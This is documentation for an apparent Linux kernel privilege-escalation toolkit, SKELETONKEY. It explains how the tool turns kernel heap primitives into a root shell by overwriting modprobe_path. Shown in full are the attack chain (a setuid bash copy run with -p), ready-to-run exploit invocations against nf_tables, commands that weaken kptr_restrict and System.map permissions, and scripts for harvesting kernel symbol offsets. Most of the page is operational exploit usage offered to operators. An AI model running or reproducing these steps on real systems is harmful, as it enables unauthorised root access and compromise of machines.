# SKELETONKEY — kernel offset resolution

The 7 🟡 PRIMITIVE modules each land a kernel-side primitive (heap-OOB
write, slab UAF, etc.). The default `--exploit` returns
`SKELETONKEY_EXPLOIT_FAIL` after the primitive fires — the verified-vs-claimed
bar means we don't claim root unless we empirically have it.

`--full-chain` engages the shared finisher (`core/finisher.{c,h}`) which
converts the primitive to a real root pop via `modprobe_path` overwrite:

```
attacker → arb_write(modprobe_path, "/tmp/skeletonkey-mp-<pid>.sh")
        → execve("/tmp/skeletonkey-trig-<pid>")     # unknown-format binary
        → kernel call_modprobe()                # spawns modprobe_path as init
        → /tmp/skeletonkey-mp-<pid>.sh runs as root
        → cp /bin/bash /tmp/skeletonkey-pwn-<pid>; chmod 4755 /tmp/skeletonkey-pwn-<pid>
        → caller exec /tmp/skeletonkey-pwn-<pid> -p
        → root shell
```

This requires resolving `&modprobe_path` (a single kernel virtual
address) at runtime.

## Resolution chain

`core/offsets.c` tries four sources in order, accepting the first
non-zero value for each field:

1. **Environment variables** — operator override.
   - `SKELETONKEY_KBASE=0x...`
   - `SKELETONKEY_MODPROBE_PATH=0x...`
   - `SKELETONKEY_POWEROFF_CMD=0x...`
   - `SKELETONKEY_INIT_TASK=0x...`
   - `SKELETONKEY_INIT_CRED=0x...`
   - `SKELETONKEY_CRED_OFFSET_REAL=0x...` (offset of `real_cred` in `task_struct`)
   - `SKELETONKEY_CRED_OFFSET_EFF=0x...`
   - `SKELETONKEY_UID_OFFSET=0x...` (offset of `uid_t uid` in `cred`, usually 0x4)

2. **`/proc/kallsyms`** — only useful when `kernel.kptr_restrict=0`
   OR you're already root. On modern distros (kptr_restrict=1 by
   default) non-root reads return all zeros and this source is
   silently skipped.

3. **`/boot/System.map-$(uname -r)`** — world-readable on some distros
   (older Debian, some Alma builds). Unaffected by `kptr_restrict`.

4. **Embedded table** — keyed by `uname -r` glob, entries are
   offsets *relative to `_text`* (KASLR-safe). Applied on top of a
   kbase leak (e.g. EntryBleed). Seeded empty in v0.2.0 — schema-only —
   to honor the no-fabricated-offsets rule. Operators who verify
   offsets on a specific kernel build are encouraged to upstream
   entries.

## How operators populate offsets

### One-shot (preferred for ad-hoc use)

```bash
# Look up on a kernel you control (as root, once):
sudo grep -E ' (modprobe_path|init_task|_text)$' /proc/kallsyms

# Use the addresses inline:
SKELETONKEY_MODPROBE_PATH=0xffffffff8228e7e0 \
  skeletonkey --exploit nf_tables --i-know --full-chain
```

### Automated dump (preferred for upstreaming)

`skeletonkey --dump-offsets` walks the four-source chain itself and emits
a ready-to-paste C struct entry on stdout:

```bash
sudo skeletonkey --dump-offsets
# /* Generated 2026-05-16 by `skeletonkey --dump-offsets`.
#  * Host kernel: 5.15.0-56-generic  distro=ubuntu
#  * Resolved fields: modprobe_path=kallsyms init_task=kallsyms cred=table
#  * Paste this entry into kernel_table[] in core/offsets.c.
#  */
# { .release_glob       = "5.15.0-56-generic",
#   .distro_match       = "ubuntu",
#   .rel_modprobe_path  = 0x148e480,
#   .rel_poweroff_cmd   = 0x148e3a0,
#   .rel_init_task      = 0x1c11dc0,
#   .rel_init_cred      = 0x1e0c460,
#   .cred_offset_real   = 0x738,
#   .cred_offset_eff    = 0x740,
# },
```

Paste the block into `kernel_table[]` in `core/offsets.c`, rebuild,
and the new entry covers every SKELETONKEY user on that kernel. Open a
PR to upstream it.

### Per-host (write System.map readable)

```bash
sudo chmod 0644 /boot/System.map-$(uname -r)
skeletonkey --exploit nf_tables --i-know --full-chain
```

### Per-boot (lower kptr_restrict)

```bash
sudo sysctl kernel.kptr_restrict=0
skeletonkey --exploit nf_tables --i-know --full-chain
```

Note: each of these requires root *once*. For a true non-root LPE on
an unfamiliar host you need either an info-leak module (EntryBleed
gives kbase) plus an embedded table entry, or out-of-band offset
acquisition.

## Adding entries to the embedded table

In `core/offsets.c`, `kernel_table[]` carries the schema:

```c
{ .release_glob       = "5.15.0-25-generic",
  .distro_match       = "ubuntu",
  .rel_modprobe_path  = 0x148e480,    // & _text
  .rel_poweroff_cmd   = 0x148e3a0,
  .rel_init_task      = 0x1c11dc0,
  .rel_init_cred      = 0x1e0c460,
  .cred_offset_real   = 0x758,
  .cred_offset_eff    = 0x760, },
```

To populate, on the target kernel:

```bash
# Get _text:
_text=$(grep ' _text$' /boot/System.map-$(uname -r) | awk '{print $1}')

# Get the symbols you want, subtract _text:
for sym in modprobe_path poweroff_cmd init_task init_cred; do
  addr=$(grep " $sym$" /boot/System.map-$(uname -r) | awk '{print $1}')
  printf "rel_%s = 0x%x\n" $sym $((0x$addr - 0x$_text))
done
```

Open a PR with the verified entry and a one-line note on which kernel
build + distro you tested against. Upstreamed entries make the
`--full-chain` path work out-of-the-box for that build.

## Verifying success

The shared finisher (`skeletonkey_finisher_modprobe_path()`) drops a
sentinel file at `/tmp/skeletonkey-pwn-<pid>` after `modprobe` runs our
payload. The finisher polls for this file with `S_ISUID` mode set
for up to 3 seconds. Only when the sentinel materializes does the
module return `SKELETONKEY_EXPLOIT_OK` and (unless `--no-shell`) exec
the setuid bash to drop a root shell.

If the sentinel never appears the module returns `SKELETONKEY_EXPLOIT_FAIL`
with a diagnostic. Reasons it might fail even with offsets resolved:

- The arb-write didn't actually land (slab adjacency lost, value-pointer
  field at unexpected offset, race not won)
- `modprobe_path` resolution was wrong (KASLR slide miscalculated,
  embedded-table entry stale)
- Kernel `STATIC_USERMODEHELPER` config disables the modprobe path
- AppArmor / SELinux / Lockdown LSM blocks the userspace `modprobe`
  invocation

## Why `modprobe_path` and not `current->cred->uid = 0`?

The cred-overwrite finisher needs an arb-READ primitive too — to walk
the task linked list from `init_task` and find the calling process's
`task_struct`. Most of our 🟡 modules have only an arb-write primitive,
not a paired read. `modprobe_path` only needs a write to a single
known global, which is why it's the default finisher.
